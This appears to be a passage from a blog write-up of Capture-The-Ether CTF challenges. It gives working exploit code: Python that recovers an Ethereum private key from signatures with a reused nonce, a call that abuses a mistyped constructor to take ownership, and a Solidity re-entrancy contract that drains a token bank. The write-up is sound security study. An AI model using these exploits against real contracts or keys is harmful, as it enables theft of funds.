<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> brownie <span class="keyword">import</span> AccountTakeoverChallenge, accounts</span><br><span class="line"><span class="keyword">from</span> rlp <span class="keyword">import</span> encode</span><br><span class="line"><span class="keyword">from</span> ethereum.transactions <span class="keyword">import</span> Transaction</span><br><span class="line"><span class="keyword">from</span> fastecdsa.curve <span class="keyword">import</span> secp256k1</span><br><span class="line"><span class="keyword">from</span> eth_utils <span class="keyword">import</span> keccak</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calculate_hsh</span>(<span class="params">tx</span>):</span><br><span class="line">    new_tx = Transaction(tx[<span class="string">&#x27;nonce&#x27;</span>], tx[<span class="string">&#x27;gasPrice&#x27;</span>], tx[<span class="string">&#x27;gasLimit&#x27;</span>],</span><br><span class="line">                         tx[<span class="string">&#x27;to&#x27;</span>], tx[<span class="string">&#x27;value&#x27;</span>], tx[<span class="string">&#x27;data&#x27;</span>], tx[<span class="string">&#x27;v&#x27;</span>])</span><br><span class="line">    data = Transaction.serialize(new_tx)</span><br><span class="line">    z = <span class="built_in">int</span>(keccak(encode(data)).<span class="built_in">hex</span>(), <span class="number">16</span>)</span><br><span class="line">    <span class="keyword">return</span> z</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    deployer = accounts[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    contract = AccountTakeoverChallenge.deploy(&#123;<span class="string">&#x27;from&#x27;</span>: deployer&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ropsten is depreciated, so i got this from other writeups online.</span></span><br><span class="line">    reconstructed_tx_1 = &#123;</span><br><span class="line">        <span class="string">&#x27;nonce&#x27;</span>: <span class="number">0x00</span>,</span><br><span class="line">        <span class="string">&#x27;gasPrice&#x27;</span>: <span class="number">0x3b9aca00</span>,</span><br><span class="line">        <span class="string">&#x27;gasLimit&#x27;</span>: <span class="number">0x5208</span>,</span><br><span class="line">        <span class="string">&#x27;to&#x27;</span>: <span class="string">&#x27;0x92b28647ae1f3264661f72fb2eb9625a89d88a31&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;value&#x27;</span>: <span class="number">0x1111d67bb1bb0000</span>,</span><br><span class="line">        <span class="string">&#x27;data&#x27;</span>: <span class="string">b&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;v&#x27;</span>: <span class="number">0x03</span></span><br><span class="line">    &#125;</span><br><span class="line">    reconstructed_tx_2 = &#123;</span><br><span class="line">        <span class="string">&#x27;nonce&#x27;</span>: <span class="number">0x01</span>,</span><br><span class="line">        <span class="string">&#x27;gasPrice&#x27;</span>: <span class="number">0x3b9aca00</span>,</span><br><span class="line">        <span class="string">&#x27;gasLimit&#x27;</span>: <span class="number">0x5208</span>,</span><br><span class="line">        <span class="string">&#x27;to&#x27;</span>: <span class="string">&#x27;0x92b28647ae1f3264661f72fb2eb9625a89d88a31&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;value&#x27;</span>: <span class="number">0x1922e95bca330e00</span>,</span><br><span class="line">        <span class="string">&#x27;data&#x27;</span>: <span class="string">b&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;v&#x27;</span>: <span class="number">0x03</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># message hash values</span></span><br><span class="line">    z1 = calculate_hsh(reconstructed_tx_1)</span><br><span class="line">    z2 = calculate_hsh(reconstructed_tx_2)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># r and s values from the writeups</span></span><br><span class="line">    r = <span class="number">0x69a726edfb4b802cbf267d5fd1dabcea39d3d7b4bf62b9eeaeba387606167166</span></span><br><span class="line">    s1 = <span class="number">0x7724cedeb923f374bef4e05c97426a918123cc4fec7b07903839f12517e1b3c8</span></span><br><span class="line">    s2 = <span class="number">0x2bbd9c2a6285c2b43e728b17bda36a81653dd5f4612a2e0aefdb48043c5108de</span></span><br><span class="line">    p = secp256k1.q</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">inv</span>(<span class="params">x, p</span>): <span class="keyword">return</span> <span class="built_in">int</span>(invert(x, p))</span><br><span class="line"></span><br><span class="line">    k = ((z1 - z2) * inv(s1 - s2, p)) % p</span><br><span class="line">    d = ((k*s1 - z1) * inv(r, p)) % p</span><br><span class="line">    <span class="keyword">assert</span> ((k*s2 - z2) * inv(r, p)) % p == d</span><br><span class="line"></span><br><span class="line">    player = accounts.add(private_key=d)</span><br><span class="line">    <span class="keyword">assert</span> player.address == <span class="string">&#x27;0x6B477781b0e68031109f21887e6B5afEAaEB002b&#x27;</span>, player.address</span><br><span class="line">    contract.authenticate(&#123;<span class="string">&#x27;from&#x27;</span>: player&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">assert</span> contract.isComplete() == <span class="literal">True</span></span><br></pre></td></tr></table></figure>

<hr>
<h3 id="Miscellaneous"><a href="#Miscellaneous" class="headerlink" title="Miscellaneous"></a>Miscellaneous</h3><h2 id="Asume-ownership"><a href="#Asume-ownership" class="headerlink" title="Asume ownership"></a>Asume ownership</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.21</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">AssumeOwnershipChallenge</span> &#123;</span><br><span class="line">    address owner;</span><br><span class="line">    bool public isComplete;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">AssumeOwmershipChallenge</span>(<span class="params"></span>) public &#123;</span><br><span class="line">        owner = msg.<span class="property">sender</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">authenticate</span>(<span class="params"></span>) public &#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.<span class="property">sender</span> == owner);</span><br><span class="line"></span><br><span class="line">        isComplete = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>To complete this challenge we need to become <code>owner</code>. if we observe the constructor of this contract it contains a typo, so it doesn’t count as a constructor anymore and it is a public function that everyone can call and this function sets the owner. so we can simply call the <code>AssumeOwmershipChallenge()</code> function to become the owner.</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> brownie <span class="keyword">import</span> AssumeOwnershipChallenge, accounts</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    deployer = accounts[<span class="number">0</span>]</span><br><span class="line">    player = accounts[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    contract = AssumeOwnershipChallenge.deploy(&#123;<span class="string">&#x27;from&#x27;</span>: deployer&#125;)</span><br><span class="line"></span><br><span class="line">    contract.AssumeOwmershipChallenge(&#123;<span class="string">&#x27;from&#x27;</span>: player&#125;)</span><br><span class="line">    contract.authenticate(&#123;<span class="string">&#x27;from&#x27;</span>: player&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">assert</span> contract.isComplete() == <span class="literal">True</span></span><br></pre></td></tr></table></figure>

<h2 id="Token-bank"><a href="#Token-bank" class="headerlink" title="Token bank"></a>Token bank</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.21</span>;</span><br><span class="line"></span><br><span class="line">interface <span class="title class_">ITokenReceiver</span> &#123;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">tokenFallback</span>(<span class="params">address <span class="keyword">from</span>, uint256 value, bytes data</span>) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">SimpleERC223Token</span> &#123;</span><br><span class="line">    <span class="comment">// Track how many tokens are owned by each address.</span></span><br><span class="line">    mapping (<span class="function"><span class="params">address</span> =&gt;</span> uint256) public balanceOf;</span><br><span class="line"></span><br><span class="line">    string public name = <span class="string">&quot;Simple ERC223 Token&quot;</span>;</span><br><span class="line">    string public symbol = <span class="string">&quot;SET&quot;</span>;</span><br><span class="line">    uint8 public decimals = <span class="number">18</span>;</span><br><span class="line"></span><br><span class="line">    uint256 public totalSupply = <span class="number">1000000</span> * (<span class="title function_">uint256</span>(<span class="number">10</span>) ** decimals);</span><br><span class="line"></span><br><span class="line">    event <span class="title class_">Transfer</span>(address indexed <span class="keyword">from</span>, address indexed to, uint256 value);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">SimpleERC223Token</span>(<span class="params"></span>) public &#123;</span><br><span class="line">        balanceOf[msg.<span class="property">sender</span>] = totalSupply;</span><br><span class="line">        emit <span class="title class_">Transfer</span>(<span class="title function_">address</span>(<span class="number">0</span>), msg.<span class="property">sender</span>, totalSupply);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">isContract</span>(<span class="params">address _addr</span>) private view returns (bool is_contract) &#123;</span><br><span class="line">        uint length;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            <span class="comment">//retrieve the size of the code on target address, this needs assembly</span></span><br><span class="line">            length := <span class="title function_">extcodesize</span>(_addr)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> length &gt; <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">transfer</span>(<span class="params">address to, uint256 value</span>) public returns (bool success) &#123;</span><br><span class="line">        bytes memory empty;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">transfer</span>(to, value, empty);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">transfer</span>(<span class="params">address to, uint256 value, bytes data</span>) public returns (bool) &#123;</span><br><span class="line">        <span class="built_in">require</span>(balanceOf[msg.<span class="property">sender</span>] &gt;= value);</span><br><span class="line"></span><br><span class="line">        balanceOf[msg.<span class="property">sender</span>] -= value;</span><br><span class="line">        balanceOf[to] += value;</span><br><span class="line">        emit <span class="title class_">Transfer</span>(msg.<span class="property">sender</span>, to, value);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_">isContract</span>(to)) &#123;</span><br><span class="line">            <span class="title class_">ITokenReceiver</span>(to).<span class="title function_">tokenFallback</span>(msg.<span class="property">sender</span>, value, data);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    event <span class="title class_">Approval</span>(address indexed owner, address indexed spender, uint256 value);</span><br><span class="line"></span><br><span class="line">    <span class="title function_">mapping</span>(<span class="function"><span class="params">address</span> =&gt;</span> <span class="title function_">mapping</span>(<span class="function"><span class="params">address</span> =&gt;</span> uint256)) public allowance;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">approve</span>(<span class="params">address spender, uint256 value</span>)</span><br><span class="line">        public</span><br><span class="line">        returns (bool success)</span><br><span class="line">    &#123;</span><br><span class="line">        allowance[msg.<span class="property">sender</span>][spender] = value;</span><br><span class="line">        emit <span class="title class_">Approval</span>(msg.<span class="property">sender</span>, spender, value);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">transferFrom</span>(<span class="params">address <span class="keyword">from</span>, address to, uint256 value</span>)</span><br><span class="line">        public</span><br><span class="line">        returns (bool success)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">require</span>(value &lt;= balanceOf[<span class="keyword">from</span>]);</span><br><span class="line">        <span class="built_in">require</span>(value &lt;= allowance[<span class="keyword">from</span>][msg.<span class="property">sender</span>]);</span><br><span class="line"></span><br><span class="line">        balanceOf[<span class="keyword">from</span>] -= value;</span><br><span class="line">        balanceOf[to] += value;</span><br><span class="line">        allowance[<span class="keyword">from</span>][msg.<span class="property">sender</span>] -= value;</span><br><span class="line">        emit <span class="title class_">Transfer</span>(<span class="keyword">from</span>, to, value);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">TokenBankChallenge</span> &#123;</span><br><span class="line">    <span class="title class_">SimpleERC223Token</span> public token;</span><br><span class="line">    <span class="title function_">mapping</span>(<span class="function"><span class="params">address</span> =&gt;</span> uint256) public balanceOf;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">TokenBankChallenge</span>(<span class="params">address player</span>) public &#123;</span><br><span class="line">        token = <span class="keyword">new</span> <span class="title class_">SimpleERC223Token</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Divide up the 1,000,000 tokens, which are all initially assigned to</span></span><br><span class="line">        <span class="comment">// the token contract&#x27;s creator (this contract).</span></span><br><span class="line">        balanceOf[msg.<span class="property">sender</span>] = <span class="number">500000</span> * <span class="number">10</span>**<span class="number">18</span>;  <span class="comment">// half for me</span></span><br><span class="line">        balanceOf[player] = <span class="number">500000</span> * <span class="number">10</span>**<span class="number">18</span>;      <span class="comment">// half for you</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">isComplete</span>(<span class="params"></span>) public view returns (bool) &#123;</span><br><span class="line">        <span class="keyword">return</span> token.<span class="title function_">balanceOf</span>(<span class="variable language_">this</span>) == <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">tokenFallback</span>(<span class="params">address <span class="keyword">from</span>, uint256 value, bytes</span>) public &#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.<span class="property">sender</span> == <span class="title function_">address</span>(token));</span><br><span class="line">        <span class="built_in">require</span>(balanceOf[<span class="keyword">from</span>] + value &gt;= balanceOf[<span class="keyword">from</span>]);</span><br><span class="line"></span><br><span class="line">        balanceOf[<span class="keyword">from</span>] += value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">withdraw</span>(<span class="params">uint256 amount</span>) public &#123;</span><br><span class="line">        <span class="built_in">require</span>(balanceOf[msg.<span class="property">sender</span>] &gt;= amount);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">require</span>(token.<span class="title function_">transfer</span>(msg.<span class="property">sender</span>, amount));</span><br><span class="line">        balanceOf[msg.<span class="property">sender</span>] -= amount;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>To complete this challenge we need to steal the balance. if we observe here we have 2 contracts <code>SimpleERC223Token</code> and <code>TokenBankChallenge</code> and 2 kinds of balances one inside each contract we need to steal the balance inside the <code>SimpleERC223Token</code> and we can understand that the challenge contract contains the full amount of balance inside the token contract and the it shares the balance inside of it with the owner and player. if we look at the transfer function inside the token contract it calls a <code>tokenFallback()</code> function if the to_address is a contract, now if we observe the challenge contract inside the withdraw function it calls the <code>token.transfer()</code> and then deduct our balance, it indirectly calls <code>tokenFallback()</code> function. so if we again call <code>withdraw()</code> function inside our <code>tokenFallback()</code> function of our contract we can make the contract to transfer the amount again, since the <code>token.transfer()</code> activates <code>tokenFallback()</code> and then <code>withdraw()</code> function and this all happens before the deduction of our balance so our balance stays the same even if we actually got our funds trasfered. this is an <code>re-entrancy</code> attack and we can call the <code>withdraw()</code> fucntion util we drain the contract’s balance. so in this case we call <code>withdraw()</code> 2 times one manually and one inside the <code>tokenFallback()</code> function and we get all the funds to our address hance we completed the challange.</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">interface <span class="title class_">TokenBankChallenge</span> &#123;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">isComplete</span>(<span class="params"></span>) external view returns (bool);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">token</span>(<span class="params"></span>) external view returns (address);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">balanceOf</span>(<span class="params">address</span>) external view returns (uint256);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">withdraw</span>(<span class="params">uint256 amount</span>) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface <span class="title class_">Token</span> &#123;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">balanceOf</span>(<span class="params">address</span>) external view returns (uint256);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Tb</span>_Exploit &#123;</span><br><span class="line">    <span class="title class_">TokenBankChallenge</span> public tb;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">set</span>(<span class="params">address _address</span>) public &#123;</span><br><span class="line">        tb = <span class="title class_">TokenBankChallenge</span>(_address);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">tokenFallback</span>(<span class="params"></span></span><br><span class="line"><span class="params">        address <span class="keyword">from</span>,</span></span><br><span class="line"><span class="params">        uint256 value,</span></span><br><span class="line"><span class="params">        bytes calldata data</span></span><br><span class="line"><span class="params">    </span>) public &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title class_">Token</span>(tb.<span class="title function_">token</span>()).<span class="title function_">balanceOf</span>(<span class="title function_">address</span>(tb)) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="title function_">withdraw</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">withdraw</span>(<span class="params"></span>) public &#123;</span><br><span class="line">        tb.<span class="title function_">withdraw</span>(tb.<span class="title function_">balanceOf</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>)));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> brownie <span class="keyword">import</span> TokenBankChallenge, Tb_Exploit, accounts</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    deployer = accounts[<span class="number">0</span>]</span><br><span class="line">    player = accounts[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    exploit = Tb_Exploit.deploy(&#123;<span class="string">&#x27;from&#x27;</span>: player&#125;)</span><br><span class="line">    contract = TokenBankChallenge.deploy(exploit.address, &#123;<span class="string">&#x27;from&#x27;</span>: deployer&#125;)</span><br><span class="line"></span><br><span class="line">    exploit.<span class="built_in">set</span>(contract.address, &#123;<span class="string">&#x27;from&#x27;</span>: player&#125;)</span><br><span class="line">    exploit.withdraw(&#123;<span class="string">&#x27;from&#x27;</span>: player&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">assert</span> contract.isComplete() == <span class="literal">True</span></span><br></pre></td></tr></table></figure>

<hr>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a href="/tags/">tags</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#Math"><span class="toc-number">1.</span> <span class="toc-text">Math</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Token-sale"><span class="toc-number"></span> <span class="toc-text">Token sale</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Token-whale"><span class="toc-number"></span> <span class="toc-text">Token whale</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Retirement-fund"><span class="toc-number"></span> <span class="toc-text">Retirement fund</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Mapping"><span class="toc-number"></span> <span class="toc-text">Mapping</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Donation"><span class="toc-number"></span> <span class="toc-text">Donation</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Fifty-years"><span class="toc-number"></span> <span class="toc-text">Fifty years</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Accounts"><span class="toc-number">1.</span> <span class="toc-text">Accounts</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Fuzzy-identity"><span class="toc-number"></span> <span class="toc-text">Fuzzy identity</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Public-key"><span class="toc-number"></span> <span class="toc-text">Public key</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Account-takeover"><span class="toc-number"></span> <span class="toc-text">Account takeover</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Miscellaneous"><span class="toc-number">1.</span> <span class="toc-text">Miscellaneous</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Asume-ownership"><span class="toc-number"></span> <span class="toc-text">Asume ownership</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Token-bank"><span class="toc-number"></span> <span class="toc-text">Token bank</span></a>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/12/03/Capture-The-Ether-CTF-Math-Accounts-Miscellaneous/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/12/03/Capture-The-Ether-CTF-Math-Accounts-Miscellaneous/&text=Capture-The-Ether CTF - Math, Accounts &amp; Miscellaneous"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/12/03/Capture-The-Ether-CTF-Math-Accounts-Miscellaneous/&title=Capture-The-Ether CTF - Math, Accounts &amp; Miscellaneous"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/12/03/Capture-The-Ether-CTF-Math-Accounts-Miscellaneous/&is_video=false&description=Capture-The-Ether CTF - Math, Accounts &amp; Miscellaneous"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Capture-The-Ether CTF - Math, Accounts &amp; Miscellaneous&body=Check out this article: http://example.com/2022/12/03/Capture-The-Ether-CTF-Math-Accounts-Miscellaneous/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/12/03/Capture-The-Ether-CTF-Math-Accounts-Miscellaneous/&title=Capture-The-Ether CTF - Math, Accounts &amp; Miscellaneous"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/12/03/Capture-The-Ether-CTF-Math-Accounts-Miscellaneous/&title=Capture-The-Ether CTF - Math, Accounts &amp; Miscellaneous"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/12/03/Capture-The-Ether-CTF-Math-Accounts-Miscellaneous/&title=Capture-The-Ether CTF - Math, Accounts &amp; Miscellaneous"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
